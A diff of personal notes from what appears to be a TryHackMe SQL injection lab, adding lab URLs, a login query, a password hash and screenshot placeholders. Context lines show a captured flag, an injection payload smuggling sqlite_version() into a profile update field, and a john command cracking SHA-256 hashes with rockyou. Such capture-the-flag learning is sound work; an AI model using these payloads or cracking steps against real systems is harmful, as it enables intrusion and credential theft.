@@ -104,6 +104,24 @@ THM{727334fd0f0ea1b836a8d443f09dc8eb}|
 
 ',nickName=sqlite_version(),email='
 
+http://10.10.218.93:5000/sesqli5/login
+
+```
+SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=? AND password=?
+```
+
+![[Pasted image 20230706055157.png]]
+
+http://10.10.218.93:5000/sesqli5/home
+
+![[Pasted image 20230706060132.png]]
+
+http://10.10.218.93:5000/sesqli5/profile
+
+![[Pasted image 20230706063419.png]]
+
+
+
 https://www.onlinehashcrack.com/wh86lv20ap
 
 ```
@@ -112,6 +130,11 @@ find / -type f -name rockyou.txt 2>/dev/null
 ```
 
 ![[Pasted image 20230704222216.png]]
+
+```
+47f274ce60fb8335f29cbe4437fc56108d099dfa914fad4064ec1239ada24f13
+```
+https://gchq.github.io/CyberChef/
 
 ```
 john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt sqli1.txt
